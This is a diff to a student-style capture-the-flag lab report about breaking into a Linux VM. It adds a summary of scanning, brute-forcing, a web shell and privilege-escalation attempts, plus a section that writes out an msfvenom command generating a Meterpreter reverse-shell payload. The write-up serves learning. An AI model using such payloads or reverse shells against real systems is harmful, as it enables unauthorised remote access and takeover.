@@ -84,7 +84,9 @@ The goal is to use the tools and techniques available in Kali Linux to explore t
 
 
 \section{Summary}
-
+In this exercise, we had to break into a Linux server VM and find six hidden flags. To gain access, we first scanned the network with \texttt{nmap} and discovered four web servers. One of these required brute-forcing to retrieve the first flag, which then allowed us to gain a web shell to the system. Using the web shell, we brute-forced the password for the current user to SSH into the machine. Once logged in, we explored the system to find flags.\abc
+We discovered a flag in the comments of the server's \texttt{python} file, which we found by inspecting the running processes. The file was intended to run as a process, and this led us to locate it. Additionally, we found flags in the history of another user who had permission to view \texttt{secret\_flag.txt} in the \texttt{/opt} directory, as well as one flag in the \texttt{/tmp} directory. There are actually seven flags in total, with one located in the home directory of \texttt{/root}.\abc
+We attempted to gain root access using the \texttt{Linux Smart Enumeration} tool and by analyzing the results for potential privilege escalation vectors, such as \texttt{SUID} binaries or binaries we could run with \texttt{sudo} to escalate to a shell. We also tried using a \texttt{getshell} from \texttt{meterpreter} to gain access, but none of these methods worked. As a result, we edited the boot configurations in the VM itself to get a shell and then changed the root password. This allowed us to execute the CTF setup script and view the final flag in the root's home directory.\footnote{The task definition and summary were generated using ChatGPT from the original bullet points.}
 \newpage
 
 \section{Complete network topology of the exercise}
@@ -335,7 +337,9 @@ If you want to escalate your privileges on Linux, you have five options, which a
 \subsubsection{trying a kernel level exploit}
 \subsubsection{checking suid binarys}
 \subsubsection{checking root proccses}
-\subsubsection{trying metasploit}
+\subsubsection{Trying to get privileges using Metasploit and Meterpreter}
+Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.\abc
+To do this, we had to generate a payload first. While we could have just used a Netcat shell and upgraded to Meterpreter, we took this opportunity to learn something new. The payload was generated with the following command: \texttt{msfvenom -p linux/x86/meterpreter/reverse\_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin}, which is also broken down below.
 \subsubsection{trying other common ctf priv escalation ways}
 \subsection{reseting the root password and exploring the vm}
 \subsection{7 flags}
